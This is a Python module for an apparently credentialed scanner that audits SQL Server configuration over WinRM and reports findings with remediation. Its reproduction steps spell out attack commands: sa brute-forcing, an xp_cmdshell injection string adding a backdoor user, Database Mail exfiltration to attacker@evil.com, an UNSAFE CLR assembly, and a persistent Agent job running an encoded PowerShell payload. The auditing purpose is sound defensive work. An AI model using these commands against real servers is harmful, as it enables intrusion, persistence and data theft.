"""Windows SQL Server Deep Audit — credentialed WinRM check.

Performs a deep security audit of Microsoft SQL Server instances via WinRM
using sqlcmd. Checks SA account, xp_cmdshell, mixed auth, linked servers,
CLR integration, database mail, remote access, SQL Agent CmdExec jobs, and
SQL Server version/patch level.
"""
from __future__ import annotations

import re
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

CVSS_CRIT = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
CVSS_HIGH = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"
CVSS_MED  = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"

# SQL Server build numbers by version — used for patch level assessment
# Format: (major, minor) -> description
MSSQL_VERSIONS = {
    (16, 0): "SQL Server 2022",
    (15, 0): "SQL Server 2019",
    (14, 0): "SQL Server 2017",
    (13, 0): "SQL Server 2016",
    (12, 0): "SQL Server 2014",
    (11, 0): "SQL Server 2012",
    (10, 50): "SQL Server 2008 R2",
    (10, 0): "SQL Server 2008",
    (9, 0): "SQL Server 2005",
}

# EOL versions
MSSQL_EOL = {
    (9, 0), (10, 0), (10, 50), (11, 0), (12, 0)
}

# sqlcmd base command — uses Windows integrated auth (runs as the WinRM user)
# -b = exit on error, -W = remove trailing spaces, -h -1 = no header row dashes
_SQLCMD_BASE = "sqlcmd -S localhost -b -W"


def _sqlcmd(query: str) -> str:
    """Wrap a SQL query in sqlcmd command."""
    escaped = query.replace('"', '\\"')
    return f'{_SQLCMD_BASE} -Q "{escaped}"'


def _parse_sqlcmd_value(stdout: str, col_index: int = 0) -> str:
    """Extract the first data value from sqlcmd output (skip header + dashes row)."""
    lines = [ln.strip() for ln in (stdout or "").splitlines() if ln.strip()]
    # sqlcmd output: header row, dashes row, data rows, blank, rows affected
    data_lines = []
    skip_next = False
    header_seen = False
    for line in lines:
        if re.match(r'^-+(\s+-+)*$', line):
            header_seen = True
            continue
        if header_seen and not line.startswith("(") and "rows affected" not in line.lower():
            data_lines.append(line)
    if data_lines:
        parts = data_lines[0].split()
        if col_index < len(parts):
            return parts[col_index]
        return data_lines[0]
    return ""


def _parse_sqlcmd_rows(stdout: str) -> list[list[str]]:
    """Parse sqlcmd tabular output into rows of values (after header+dashes)."""
    lines = [ln.strip() for ln in (stdout or "").splitlines() if ln.strip()]
    rows = []
    header_seen = False
    for line in lines:
        if re.match(r'^-+(\s+-+)*$', line):
            header_seen = True
            continue
        if header_seen:
            if line.startswith("(") and "rows affected" in line.lower():
                break
            rows.append(line.split())
    return rows


class WinMssqlDeep(BaseModule):
    NAME        = "win_mssql_deep"
    DESCRIPTION = "WinRM credentialed: deep SQL Server security configuration audit"
    PHASE       = 5
    TAGS        = ["credentialed", "windows", "mssql", "database", "sql-server"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        transport_mgr = self.config.extra.get("transport_manager")
        if not transport_mgr or not transport_mgr.has_creds("winrm"):
            return self._make_result(start, skipped=True, skip_reason="no WinRM credentials")

        hosts = self.config.extra.get("live_hosts", [self.config.target])
        for host in hosts[:20]:
            if not self.check_scope(host):
                continue
            await self.rate_limit()
            session = await transport_mgr.get_winrm_session(host)
            if not session:
                continue
            await self._audit_host(host, transport_mgr.winrm, session)

        return self._make_result(start)

    async def _audit_host(self, host: str, winrm, session) -> None:
        # Verify sqlcmd is available and SQL Server is accessible
        ver_result = await winrm.execute(
            session, _sqlcmd("SELECT @@VERSION")
        )
        if not ver_result.success or not (ver_result.stdout or "").strip():
            # Try named instance discovery
            named_result = await winrm.execute(
                session,
                "Get-Service | Where-Object { $_.DisplayName -like 'SQL Server (*' } "
                "| Select-Object Name | Format-Table -HideTableHeaders | Out-String"
            )
            if not named_result.success or not (named_result.stdout or "").strip():
                return
            # SQL Server found as named instance — log and skip deep checks
            return

        version_raw = ver_result.stdout or ""

        await self._check_version(host, version_raw)
        await self._check_sa_account(host, winrm, session)
        await self._check_xp_cmdshell(host, winrm, session)
        await self._check_sql_browser(host, winrm, session)
        await self._check_auth_mode(host, winrm, session)
        await self._check_linked_servers(host, winrm, session)
        await self._check_db_mail(host, winrm, session)
        await self._check_clr(host, winrm, session)
        await self._check_remote_access(host, winrm, session)
        await self._check_agent_cmdexec(host, winrm, session)

    # ── Check 1: SQL Server version / patch level ────────────────────────────

    async def _check_version(self, host: str, version_raw: str) -> None:
        """Parse SQL Server version and flag EOL or unpatched versions."""
        # @@VERSION format: "Microsoft SQL Server 2019 (RTM-CU27) (KB5037331) - 15.0.4375.4 (X64)"
        m = re.search(r'(\d+)\.(\d+)\.(\d+)\.(\d+)', version_raw)
        if not m:
            return

        major, minor, build, rev = int(m.group(1)), int(m.group(2)), int(m.group(3)), int(m.group(4))
        version_key = (major, minor)
        version_name = MSSQL_VERSIONS.get(version_key, f"SQL Server (unknown {major}.{minor})")
        is_eol = version_key in MSSQL_EOL

        if is_eol:
            self.new_finding(
                title=f"SQL Server End-of-Life Version Detected — {version_name} — {host}",
                severity=Severity.CRITICAL,
                description=(
                    f"SQL Server on {host} is running an End-of-Life version: "
                    f"{version_name} ({major}.{minor}.{build}.{rev}). "
                    f"EOL versions no longer receive security patches from Microsoft. "
                    f"Known exploitable vulnerabilities include privilege escalation, "
                    f"information disclosure, and remote code execution. "
                    f"SQL Server 2012 (EOL Jul 2022), 2014 (EOL Jul 2024), 2008/R2 (EOL Jul 2019). "
                    f"Attackers actively target unpatched database servers as high-value lateral "
                    f"movement and data exfiltration targets."
                ),
                reproduction_steps=[
                    f"sqlcmd -S {host} -Q \"SELECT @@VERSION\"",
                    "# Full version string confirms EOL build",
                ],
                remediation=(
                    f"1. Migrate to SQL Server 2019 or 2022 (current supported versions). "
                    f"2. If immediate migration is not possible, isolate the host from the network "
                    f"and restrict access to minimum required accounts. "
                    f"3. Enable Windows Defender on the host as compensating control. "
                    f"4. Plan migration within 90 days."
                ),
                references=[
                    "https://learn.microsoft.com/en-us/troubleshoot/sql/general/use-sql-server-products-lifecycle",
                    "https://endoflife.date/mssqlserver",
                ],
                evidence=Evidence(extra={
                    "host": host,
                    "version_name": version_name,
                    "version_string": f"{major}.{minor}.{build}.{rev}",
                    "eol": True,
                }),
                cvss_v31_vector=CVSS_CRIT,
                mitre_attack=["TA0001/T1190", "TA0006/T1212"],
                target=host, service="winrm", confidence="HIGH",
            )
        else:
            # Flag the version as informational for report context
            self.new_finding(
                title=f"SQL Server Version Identified — {version_name} {build}.{rev} — {host}",
                severity=Severity.INFO,
                description=(
                    f"SQL Server on {host} is running {version_name} build {major}.{minor}.{build}.{rev}. "
                    f"Review Microsoft's latest Cumulative Update list to confirm this is the latest "
                    f"available patch level for this major version."
                ),
                reproduction_steps=[f"sqlcmd -S {host} -Q \"SELECT @@VERSION\""],
                remediation="Apply latest Cumulative Update from https://learn.microsoft.com/sql/database-engine/install-windows/latest-updates-for-microsoft-sql-server",
                references=[
                    "https://learn.microsoft.com/en-us/sql/database-engine/install-windows/latest-updates-for-microsoft-sql-server",
                ],
                evidence=Evidence(extra={
                    "host": host,
                    "version": f"{major}.{minor}.{build}.{rev}",
                    "version_name": version_name,
                }),
                cvss_v31_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",
                target=host, service="winrm", confidence="HIGH",
            )

    # ── Check 2: SA account enabled ──────────────────────────────────────────

    async def _check_sa_account(self, host: str, winrm, session) -> None:
        """Check if the 'sa' account is enabled."""
        result = await winrm.execute(
            session,
            _sqlcmd("SELECT name, is_disabled FROM sys.server_principals WHERE name='sa'")
        )
        if not result.success:
            return

        rows = _parse_sqlcmd_rows(result.stdout or "")
        if not rows:
            return

        # Row: [name, is_disabled]
        for row in rows:
            if len(row) < 2:
                continue
            is_disabled = row[1].strip()
            if is_disabled == "0":
                self.new_finding(
                    title=f"SQL Server 'sa' Account Enabled — {host}",
                    severity=Severity.HIGH,
                    description=(
                        f"The SQL Server 'sa' (system administrator) built-in account is enabled "
                        f"on {host}. The 'sa' account has full sysadmin privileges on the SQL Server "
                        f"instance. If the password is weak or default, attackers can authenticate "
                        f"directly as 'sa' and achieve complete database compromise, data exfiltration, "
                        f"and potentially OS-level code execution via xp_cmdshell. "
                        f"The 'sa' account is the primary target of SQL Server brute-force tools "
                        f"(Hydra, Medusa, SQLPing)."
                    ),
                    reproduction_steps=[
                        f"sqlcmd -S {host} -U sa -P '' -Q \"SELECT SYSTEM_USER\"",
                        f"# Brute force:",
                        f"hydra -l sa -P /usr/share/wordlists/rockyou.txt {host} mssql",
                        f"nmap -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=pass.txt {host}",
                    ],
                    remediation=(
                        "1. Disable the sa account: ALTER LOGIN sa DISABLE; "
                        "2. If sa is required, set a strong password (32+ char random): "
                        "ALTER LOGIN sa WITH PASSWORD = '<random>'; "
                        "3. Prefer Windows Authentication (Integrated Security) over SQL mixed mode. "
                        "4. Rename the sa account to a non-obvious name."
                    ),
                    references=[
                        "CWE-798",
                        "https://learn.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode",
                        "https://attack.mitre.org/techniques/T1078/",
                    ],
                    evidence=Evidence(extra={"host": host, "sa_enabled": True}),
                    cvss_v31_vector=CVSS_HIGH,
                    mitre_attack=["TA0006/T1078.003", "TA0001/T1190"],
                    target=host, service="winrm", confidence="HIGH",
                )

    # ── Check 3: xp_cmdshell enabled ────────────────────────────────────────

    async def _check_xp_cmdshell(self, host: str, winrm, session) -> None:
        """Check if xp_cmdshell is enabled."""
        result = await winrm.execute(
            session,
            _sqlcmd("SELECT value_in_use FROM sys.configurations WHERE name='xp_cmdshell'")
        )
        if not result.success:
            return

        value = _parse_sqlcmd_value(result.stdout or "")
        if value.strip() == "1":
            self.new_finding(
                title=f"SQL Server xp_cmdshell Enabled — OS Command Execution — {host}",
                severity=Severity.CRITICAL,
                description=(
                    f"xp_cmdshell is enabled on SQL Server at {host}. This extended stored "
                    f"procedure executes OS shell commands directly from T-SQL with the "
                    f"permissions of the SQL Server service account. Any user with sysadmin "
                    f"privileges (or EXECUTE permission on xp_cmdshell) can achieve OS-level "
                    f"code execution on the server. This is the most direct SQL Server to "
                    f"OS-level privilege escalation path and is heavily used by ransomware groups "
                    f"(T1059.003) for lateral movement after initial SQL injection or credential access."
                ),
                reproduction_steps=[
                    f"sqlcmd -S {host} -U sa -P Password1 -Q \"EXEC xp_cmdshell 'whoami'\"",
                    "# Or via SQL injection:",
                    "'; EXEC xp_cmdshell 'net user backdoor P@ssw0rd /add'--",
                    "# Disable advanced options if needed first:",
                    "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;",
                    "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
                ],
                remediation=(
                    "Disable xp_cmdshell immediately: "
                    "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; "
                    "EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE; "
                    "EXEC sp_configure 'show advanced options', 0; RECONFIGURE; "
                    "If OS execution is required for application functionality, use "
                    "SQLCLR stored procedures with minimal permissions instead."
                ),
                references=[
                    "CWE-78",
                    "https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql",
                    "https://attack.mitre.org/techniques/T1059/003/",
                    "https://owasp.org/www-community/attacks/SQL_Injection",
                ],
                evidence=Evidence(extra={
                    "host": host,
                    "xp_cmdshell_enabled": True,
                }),
                cvss_v31_vector=CVSS_CRIT,
                mitre_attack=["TA0002/T1059.003", "TA0004/T1134"],
                target=host, service="winrm", confidence="HIGH",
            )

    # ── Check 4: SQL Server Browser service ─────────────────────────────────

    async def _check_sql_browser(self, host: str, winrm, session) -> None:
        """Check if SQL Server Browser service is running when it may not be needed."""
        result = await winrm.execute(
            session,
            "try { "
            "$svc = Get-Service -Name SQLBrowser -ErrorAction SilentlyContinue; "
            "if ($svc) { $svc.Status } else { 'NotFound' } "
            "} catch { 'NotFound' }"
        )
        if not result.success:
            return

        status = (result.stdout or "").strip()
        if status.lower() == "running":
            self.new_finding(
                title=f"SQL Server Browser Service Running — {host}",
                severity=Severity.LOW,
                description=(
                    f"The SQL Server Browser service is running on {host}. This service responds "
                    f"to UDP port 1434 and provides instance enumeration information to clients, "
                    f"including names and ports of all SQL Server instances on the host. "
                    f"This aids attackers in reconnaissance (T1046). If all SQL Server clients "
                    f"connect using explicit server/port specification, the Browser service "
                    f"provides no operational value and should be stopped."
                ),
                reproduction_steps=[
                    f"nmap -sU -p 1434 --script ms-sql-info {host}",
                    f"# Returns: SQL Server instance names, versions, and ports",
                ],
                remediation=(
                    "If no applications rely on named instance auto-discovery, stop and disable: "
                    "Stop-Service SQLBrowser; Set-Service SQLBrowser -StartupType Disabled. "
                    "Update all connection strings to use explicit server\\instance,port format."
                ),
                references=[
                    "https://learn.microsoft.com/en-us/sql/tools/configuration-manager/sql-server-browser-service",
                    "https://attack.mitre.org/techniques/T1046/",
                ],
                evidence=Evidence(extra={"host": host, "browser_status": status}),
                cvss_v31_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
                mitre_attack=["TA0007/T1046"],
                target=host, service="winrm", confidence="HIGH",
            )

    # ── Check 5: Mixed mode authentication ──────────────────────────────────

    async def _check_auth_mode(self, host: str, winrm, session) -> None:
        """Check if mixed mode (SQL + Windows) authentication is enabled."""
        result = await winrm.execute(
            session,
            _sqlcmd("SELECT SERVERPROPERTY('IsIntegratedSecurityOnly')")
        )
        if not result.success:
            return

        value = _parse_sqlcmd_value(result.stdout or "")
        if value.strip() == "0":
            self.new_finding(
                title=f"SQL Server Mixed Mode Authentication Enabled — {host}",
                severity=Severity.MEDIUM,
                description=(
                    f"SQL Server on {host} is configured for Mixed Mode authentication "
                    f"(SERVERPROPERTY('IsIntegratedSecurityOnly') = 0), meaning both SQL Server "
                    f"logins (username/password) and Windows logins are accepted. "
                    f"SQL logins are vulnerable to brute-force attacks and may use weak passwords. "
                    f"Windows-only authentication (Integrated Security Only) is more secure as it "
                    f"leverages Kerberos/NTLM and Active Directory account lockout policies."
                ),
                reproduction_steps=[
                    f"sqlcmd -S {host} -Q \"SELECT SERVERPROPERTY('IsIntegratedSecurityOnly')\"",
                    "# 0 = mixed mode, 1 = Windows-only",
                    f"# Test SQL login brute force:",
                    f"nmap -p 1433 --script ms-sql-brute --script-args userdb=sqlusers.txt,passdb=pass.txt {host}",
                ],
                remediation=(
                    "1. Switch to Windows-only authentication if all clients support it: "
                    "SQL Server Management Studio → Server Properties → Security → "
                    "Windows Authentication mode. Requires SQL Server service restart. "
                    "2. Audit all SQL logins and disable/remove unnecessary ones: "
                    "SELECT name, is_disabled FROM sys.server_principals WHERE type='S'; "
                    "3. If mixed mode is required, enforce strong password policy for all SQL logins."
                ),
                references=[
                    "CWE-287",
                    "https://learn.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode",
                    "https://attack.mitre.org/techniques/T1078.003/",
                ],
                evidence=Evidence(extra={"host": host, "mixed_mode": True}),
                cvss_v31_vector=CVSS_MED,
                mitre_attack=["TA0006/T1078.003"],
                target=host, service="winrm", confidence="HIGH",
            )

    # ── Check 6: Linked servers ──────────────────────────────────────────────

    async def _check_linked_servers(self, host: str, winrm, session) -> None:
        """Enumerate linked SQL servers as lateral movement paths."""
        result = await winrm.execute(
            session,
            _sqlcmd(
                "SELECT name, product, provider, data_source "
                "FROM sys.servers WHERE is_linked=1"
            )
        )
        if not result.success:
            return

        rows = _parse_sqlcmd_rows(result.stdout or "")
        if not rows:
            return

        linked = []
        for row in rows:
            if len(row) >= 1:
                linked.append({
                    "name": row[0] if len(row) > 0 else "",
                    "product": row[1] if len(row) > 1 else "",
                    "provider": row[2] if len(row) > 2 else "",
                    "data_source": row[3] if len(row) > 3 else "",
                })

        if linked:
            self.new_finding(
                title=f"SQL Server Linked Servers Configured ({len(linked)}) — {host}",
                severity=Severity.HIGH,
                description=(
                    f"SQL Server on {host} has {len(linked)} linked server(s) configured. "
                    f"Linked servers: "
                    + ", ".join(f"{l['name']} ({l['data_source']})" for l in linked[:5])
                    + ". "
                    f"Linked servers allow T-SQL queries to execute on remote SQL Server instances. "
                    f"If the linking credential has elevated permissions on the remote server, "
                    f"an attacker with access to this SQL Server can use linked servers as a "
                    f"lateral movement path (T1210). Linked server chains (A→B→C) can traverse "
                    f"network segments and domains that would otherwise be inaccessible."
                ),
                reproduction_steps=[
                    f"sqlcmd -S {host} -Q \"SELECT name,data_source FROM sys.servers WHERE is_linked=1\"",
                    "# Enumerate remote server permissions via linked server:",
                    f"sqlcmd -S {host} -Q \"EXEC [{linked[0]['name']}].master.dbo.sp_executesql N'SELECT SYSTEM_USER'\"",
                    "# Check for sysadmin via linked server:",
                    f"sqlcmd -S {host} -Q \"EXEC [{linked[0]['name']}].master.dbo.sp_executesql N'SELECT IS_SRVROLEMEMBER(''sysadmin'')'\"",
                ],
                remediation=(
                    "1. Remove unused linked servers: EXEC sp_dropserver '<name>', 'droplogins'. "
                    "2. For required linked servers, use the principle of least privilege — "
                    "the linked server login should have only SELECT access on required objects. "
                    "3. Avoid using 'be made using the login's current security context' option "
                    "— instead use a specific low-privilege login. "
                    "4. Enable 'RPC Out' only if required for the business function."
                ),
                references=[
                    "https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine",
                    "https://attack.mitre.org/techniques/T1210/",
                    "https://github.com/NetSPI/PowerUpSQL",
                ],
                evidence=Evidence(extra={"host": host, "linked_servers": linked[:20]}),
                cvss_v31_vector=CVSS_HIGH,
                mitre_attack=["TA0008/T1210", "TA0007/T1018"],
                target=host, service="winrm", confidence="HIGH",
            )

    # ── Check 7: Database Mail XPs ───────────────────────────────────────────

    async def _check_db_mail(self, host: str, winrm, session) -> None:
        """Check if Database Mail XPs are enabled."""
        result = await winrm.execute(
            session,
            _sqlcmd("SELECT value_in_use FROM sys.configurations WHERE name='Database Mail XPs'")
        )
        if not result.success:
            return

        value = _parse_sqlcmd_value(result.stdout or "")
        if value.strip() == "1":
            self.new_finding(
                title=f"SQL Server Database Mail XPs Enabled — {host}",
                severity=Severity.MEDIUM,
                description=(
                    f"Database Mail extended stored procedures are enabled on SQL Server at {host}. "
                    f"If not actively used for database alerting, this is unnecessary attack surface. "
                    f"Database Mail can be abused by an attacker with sysadmin rights to exfiltrate "
                    f"data via email (T1048), send phishing emails from the database server's mail "
                    f"context, or probe internal mail infrastructure. "
                    f"Additionally, sp_send_dbmail has historically had security issues."
                ),
                reproduction_steps=[
                    f"sqlcmd -S {host} -Q \"SELECT value_in_use FROM sys.configurations WHERE name='Database Mail XPs'\"",
                    "# If value_in_use = 1, Database Mail is active",
                    "# Exfiltrate via Database Mail (requires sysadmin):",
                    "EXEC msdb.dbo.sp_send_dbmail @recipients='attacker@evil.com', @body='data', @subject='exfil'",
                ],
                remediation=(
                    "If Database Mail is not used: "
                    "EXEC sp_configure 'Database Mail XPs', 0; RECONFIGURE; "
                    "If used, restrict sp_send_dbmail execution to only the required SQL logins "
                    "and ensure the mail profile does not relay to external addresses unnecessarily."
                ),
                references=[
                    "https://learn.microsoft.com/en-us/sql/relational-databases/database-mail/database-mail",
                    "https://attack.mitre.org/techniques/T1048/",
                ],
                evidence=Evidence(extra={"host": host, "db_mail_enabled": True}),
                cvss_v31_vector=CVSS_MED,
                mitre_attack=["TA0010/T1048"],
                target=host, service="winrm", confidence="HIGH",
            )

    # ── Check 8: CLR integration enabled ────────────────────────────────────

    async def _check_clr(self, host: str, winrm, session) -> None:
        """Check if CLR integration is enabled (arbitrary .NET assembly execution)."""
        result = await winrm.execute(
            session,
            _sqlcmd("SELECT value_in_use FROM sys.configurations WHERE name='clr enabled'")
        )
        if not result.success:
            return

        value = _parse_sqlcmd_value(result.stdout or "")
        if value.strip() == "1":
            self.new_finding(
                title=f"SQL Server CLR Integration Enabled — .NET Execution in DB — {host}",
                severity=Severity.HIGH,
                description=(
                    f"CLR (Common Language Runtime) integration is enabled on SQL Server at {host}. "
                    f"CLR integration allows .NET assemblies to be loaded into SQL Server and "
                    f"executed as stored procedures or functions. An attacker with sysadmin "
                    f"privileges can load a malicious .NET assembly containing arbitrary code "
                    f"(T1059.005) — including OS command execution, network egress, and "
                    f"credential dumping — without relying on xp_cmdshell. "
                    f"CLR is a popular xp_cmdshell bypass for post-exploitation."
                ),
                reproduction_steps=[
                    f"sqlcmd -S {host} -Q \"SELECT value_in_use FROM sys.configurations WHERE name='clr enabled'\"",
                    "# CLR-based xp_cmdshell bypass (PowerUpSQL):",
                    "Invoke-SQLOSCmd -Instance {host} -Command 'whoami'",
                    "# Or load custom assembly:",
                    "CREATE ASSEMBLY [evil] FROM 0x... WITH PERMISSION_SET = UNSAFE;",
                    "CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR(MAX) AS EXTERNAL NAME [evil].[StoredProcedures].[cmd_exec];",
                ],
                remediation=(
                    "If CLR assemblies are not used by applications: "
                    "EXEC sp_configure 'clr enabled', 0; RECONFIGURE; "
                    "If CLR is required, audit all deployed assemblies: "
                    "SELECT * FROM sys.assemblies WHERE is_user_defined=1; "
                    "Use SAFE permission set for all assemblies and avoid UNSAFE. "
                    "Enable 'clr strict security' (SQL 2017+): "
                    "EXEC sp_configure 'clr strict security', 1; RECONFIGURE;"
                ),
                references=[
                    "https://learn.microsoft.com/en-us/sql/relational-databases/clr-integration/clr-integration-enabling",
                    "https://github.com/NetSPI/PowerUpSQL",
                    "https://attack.mitre.org/techniques/T1059/005/",
                ],
                evidence=Evidence(extra={"host": host, "clr_enabled": True}),
                cvss_v31_vector=CVSS_HIGH,
                mitre_attack=["TA0002/T1059.005", "TA0004/T1134"],
                target=host, service="winrm", confidence="HIGH",
            )

    # ── Check 9: Remote access enabled ──────────────────────────────────────

    async def _check_remote_access(self, host: str, winrm, session) -> None:
        """Check if remote access config option is enabled."""
        result = await winrm.execute(
            session,
            _sqlcmd("SELECT value_in_use FROM sys.configurations WHERE name='remote access'")
        )
        if not result.success:
            return

        value = _parse_sqlcmd_value(result.stdout or "")
        if value.strip() == "1":
            self.new_finding(
                title=f"SQL Server 'remote access' Option Enabled — {host}",
                severity=Severity.MEDIUM,
                description=(
                    f"The 'remote access' server configuration option is enabled on SQL Server "
                    f"at {host}. This legacy option (deprecated as of SQL Server 2022) controls "
                    f"whether stored procedures can be executed from remote SQL Server instances "
                    f"via remote procedure calls. When enabled alongside linked servers, it "
                    f"expands the lateral movement surface. Disabling it reduces the ability "
                    f"of compromised linked server chains to propagate execution."
                ),
                reproduction_steps=[
                    f"sqlcmd -S {host} -Q \"SELECT value_in_use FROM sys.configurations WHERE name='remote access'\"",
                    "# 1 = enabled (default in older SQL Server versions)",
                ],
                remediation=(
                    "Disable remote access: "
                    "EXEC sp_configure 'remote access', 0; RECONFIGURE; "
                    "Note: This requires a SQL Server service restart to take effect."
                ),
                references=[
                    "https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-the-remote-access-server-configuration-option",
                ],
                evidence=Evidence(extra={"host": host, "remote_access_enabled": True}),
                cvss_v31_vector=CVSS_MED,
                mitre_attack=["TA0008/T1210"],
                target=host, service="winrm", confidence="HIGH",
            )

    # ── Check 10: SQL Agent CmdExec jobs ─────────────────────────────────────

    async def _check_agent_cmdexec(self, host: str, winrm, session) -> None:
        """Find SQL Agent jobs with CmdExec (OS command) steps."""
        result = await winrm.execute(
            session,
            _sqlcmd(
                "SELECT j.name, s.step_name, s.command "
                "FROM msdb.dbo.sysjobs j "
                "JOIN msdb.dbo.sysjobsteps s ON j.job_id = s.job_id "
                "WHERE s.subsystem = 'CmdExec'"
            )
        )
        if not result.success:
            return

        stdout = result.stdout or ""
        rows = _parse_sqlcmd_rows(stdout)
        if not rows:
            return

        jobs = []
        for row in rows:
            job_name = row[0] if len(row) > 0 else "unknown"
            step_name = row[1] if len(row) > 1 else "unknown"
            # Command may contain spaces and be split across columns
            command = " ".join(row[2:]) if len(row) > 2 else ""
            jobs.append({
                "job": job_name,
                "step": step_name,
                "command": command[:200],
            })

        if jobs:
            self.new_finding(
                title=f"SQL Agent Jobs With OS Command Execution ({len(jobs)} Found) — {host}",
                severity=Severity.HIGH,
                description=(
                    f"Found {len(jobs)} SQL Server Agent job step(s) using CmdExec subsystem "
                    f"(OS command execution) on {host}. Jobs: "
                    + "; ".join(f"{j['job']}: {j['command'][:80]}" for j in jobs[:5])
                    + ". "
                    f"SQL Agent CmdExec jobs execute OS commands as the SQL Server Agent service "
                    f"account. An attacker who gains control of the SQL Agent (via sysadmin access) "
                    f"can modify these jobs or create new ones for persistence (T1053.002), "
                    f"privilege escalation, and lateral movement. "
                    f"These also represent a backdoor risk if the commands are unexpected."
                ),
                reproduction_steps=[
                    f"sqlcmd -S {host} -Q "
                    "\"SELECT j.name,s.command FROM msdb.dbo.sysjobs j "
                    "JOIN msdb.dbo.sysjobsteps s ON j.job_id=s.job_id "
                    "WHERE s.subsystem='CmdExec'\"",
                    "# Review each job's command for unexpected content",
                    "# Attacker persistence via SQL Agent job:",
                    "EXEC msdb.dbo.sp_add_job @job_name='backdoor';",
                    "EXEC msdb.dbo.sp_add_jobstep @job_name='backdoor', @subsystem='CmdExec', "
                    "@command='powershell.exe -enc <payload>';",
                ],
                remediation=(
                    "1. Review all CmdExec job steps and verify their legitimacy with application owners. "
                    "2. Replace CmdExec steps with T-SQL or PowerShell subsystem steps where possible. "
                    "3. Run SQL Server Agent under a minimal-privilege service account "
                    "(not SYSTEM or local admin). "
                    "4. Restrict who can create/modify SQL Agent jobs: "
                    "remove users from SQLAgentOperatorRole who don't need job management access."
                ),
                references=[
                    "https://learn.microsoft.com/en-us/sql/ssms/agent/job-step-properties-new-job-step-general-page",
                    "https://attack.mitre.org/techniques/T1053/002/",
                    "https://github.com/NetSPI/PowerUpSQL",
                ],
                evidence=Evidence(extra={"host": host, "cmdexec_jobs": jobs[:20]}),
                cvss_v31_vector=CVSS_HIGH,
                mitre_attack=["TA0003/T1053.002", "TA0002/T1059.003"],
                target=host, service="winrm", confidence="HIGH",
            )
